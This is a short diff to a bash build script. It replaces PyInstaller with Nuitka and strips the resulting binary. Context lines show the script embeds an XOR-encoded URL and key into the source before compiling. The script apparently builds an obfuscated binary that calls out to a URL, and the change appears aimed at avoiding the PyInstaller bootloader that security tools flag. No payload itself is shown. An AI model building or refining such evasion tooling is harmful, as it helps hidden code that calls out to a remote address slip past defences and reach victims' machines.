@@ -209,7 +209,7 @@ install_deps() {
             }
         }
     fi
-    "$PYTHON" -m pip install --quiet --upgrade cryptography pyinstaller
+    "$PYTHON" -m pip install --quiet --upgrade cryptography nuitka
     echo "[+] Python packages ready"
     echo ""
 }
@@ -379,16 +379,17 @@ if ! grep -q "$URL_ENC" "$TMP_SRC" || ! grep -q "$XOR_KEY_HEX" "$TMP_SRC"; then
 fi
 
 # ── Build ─────────────────────────────────────────────────────────────────────
-echo "[*] Building with PyInstaller..."
-"$PYTHON" -m PyInstaller \
-    --onefile \
-    --name "$BINARY_NAME" \
-    --distpath "$SCRIPT_DIR" \
-    --workpath "$BUILD_TMP" \
-    --specpath "$BUILD_TMP" \
+echo "[*] Building with Nuitka (native compile, no PyInstaller bootloader)..."
+"$PYTHON" -m nuitka \
+    --standalone --onefile \
+    --assume-yes-for-downloads \
+    --output-filename="$BINARY_NAME" \
+    --output-dir="$SCRIPT_DIR" \
     "$TMP_SRC"
 
-# Strip debug symbols to reduce size and remove Python build artifacts from strings
+rm -rf "$SCRIPT_DIR"/*.build "$SCRIPT_DIR"/*.dist "$SCRIPT_DIR"/*.onefile-build 2>/dev/null || true
+
+# Strip debug symbols to reduce size
 if command -v strip &>/dev/null; then
     strip --strip-all "$SCRIPT_DIR/$BINARY_NAME" 2>/dev/null || true
 fi
